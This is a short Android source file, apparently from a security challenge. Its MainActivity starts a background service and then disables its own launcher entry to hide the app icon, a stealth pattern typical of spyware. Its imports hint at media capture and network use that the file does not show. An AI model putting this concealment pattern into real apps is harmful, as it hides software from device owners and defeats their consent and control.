package ph0wn.android.sys;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;
import android.os.Handler;
import android.util.Log;
//import android.hardware.camera2;
import android.provider.MediaStore;
import java.net.InetAddress;

import android.util.Base64;

import android.content.ComponentName;
import android.content.pm.PackageManager;


public class MainActivity extends Activity {

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
	Intent serviceIntent = new Intent(this, BackgroundService.class);
	startService(serviceIntent);
	hideAppLauncher();
    }

    private void hideAppLauncher() {
	PackageManager p = getPackageManager();
	ComponentName componentName = new ComponentName(this, ph0wn.android.sys.MainActivity.class);
	p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

 
}
